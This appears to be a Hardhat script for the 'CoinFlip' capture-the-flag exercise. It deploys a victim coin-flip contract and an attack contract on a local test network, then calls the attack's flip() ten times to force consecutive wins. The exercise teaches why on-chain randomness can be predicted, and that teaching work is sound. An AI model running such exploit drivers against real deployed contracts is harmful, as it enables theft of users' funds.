import { ethers } from "hardhat";

async function main() {
    const [owner, attacker] = await ethers.getSigners();
    const CoinFlip = await ethers.getContractFactory("CoinFlip");
    const coinFlip = await CoinFlip.deploy();
    
    console.log("CoinFlip Contract Instance address:", coinFlip.address);

    const CoinFlipAttack = await ethers.getContractFactory("CoinFlipAttack");

    // deploy the attack contract with the attacker personal address and the victim contract address
    const coinFlipAttack = await CoinFlipAttack.connect(attacker).deploy(coinFlip.address); 

    console.log("CoinFlipAttack Contract Instance address:", coinFlipAttack.address);
    const victimAddressInattackContract = await coinFlipAttack.victimContract();
    console.log("Victim Contract address in attack contract:", victimAddressInattackContract);

    // call the attack contract
    const bool = await coinFlipAttack.connect(attacker).flip();
    console.log("Attack contract called");
    console.log("Attack result:", bool);

    // check the consecutive wins in the victim contract
    const consecutiveWins = await coinFlip.consecutiveWins();
    console.log("Victim contract consecutive wins:", consecutiveWins.toString());

    // call the victim contract from the coinFlipAttack contract through attacker address and 9 times flip the coin
    for (let i = 0; i < 9; i++) {
        await coinFlipAttack.connect(attacker).flip();
    }

    // check the consecutive wins in the victim contract
    const consecutiveWinsAfterAttack = await coinFlip.consecutiveWins();
    console.log(
      "Victim contract consecutive wins after attack:",
      consecutiveWinsAfterAttack.toString()
    );



}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
